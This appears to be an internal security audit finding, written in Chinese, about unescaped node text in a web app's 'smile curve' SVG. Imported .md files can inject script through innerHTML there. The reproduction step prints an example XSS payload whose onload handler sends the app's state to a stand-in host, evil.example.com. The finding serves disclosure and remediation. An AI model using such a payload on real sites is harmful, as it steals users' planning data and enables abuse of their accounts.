# SEC04 — work1 微笑曲线 SVG 不转义,恶意导入内容可注入执行

严重度:中 / 方向:安全 / 确认度:confirmed(注入面读码可证;具体执行 gadget 需浏览器验证)

## 问题

work1 微笑曲线把价值链节点文本原样拼进 SVG 字符串再走 innerHTML:`label`、`reason`/`tip` 未经任何转义直接进 `<text>` 与 `<title>`。SVG 经 innerHTML 插入时会解析事件处理器属性(onload/onerror 类),恶意文本可执行任意 JS——读走/上传策划内容、触发 LLM 调用烧额度。

内容来源:导入的 .md 档案(importMd → 解析进 valueChain 的 label/reason)、上传文档后由 AI 起草。档案导入是协作常用路径,他人给的档案即可带毒。

安全回归测试恰好覆盖了 work4 渠道图与矩阵图 SVG 的转义,**漏了这一个**。

## 期望

buildSvg 对所有节点 label/reason/tip 先转义,与 work4/matrix_chart 对齐。

## 复现

1. 构造 .md 档案,价值链某节点 label 写 `<text onload="fetch('https://evil.example.com/?d='+encodeURIComponent(JSON.stringify(state)))">x</text>` 之类;
2. 导入该档案 → 打开 W1 微笑曲线步骤 → 文本以 SVG 节点注入并触发。

## 证据

- docs/workshop1.js:749-762 — label/why 原样拼进 SVG
- docs/workshop1.js:866 — innerHTML 挂载
- tests/security_frontend.test.js — 覆盖 work4/matrix_chart 转义,无 workshop1

## 修复方向

对 label/reason/tip 统一过转义(与 work4/matrix_chart 同一实现),并在回归测试补微笑曲线用例。
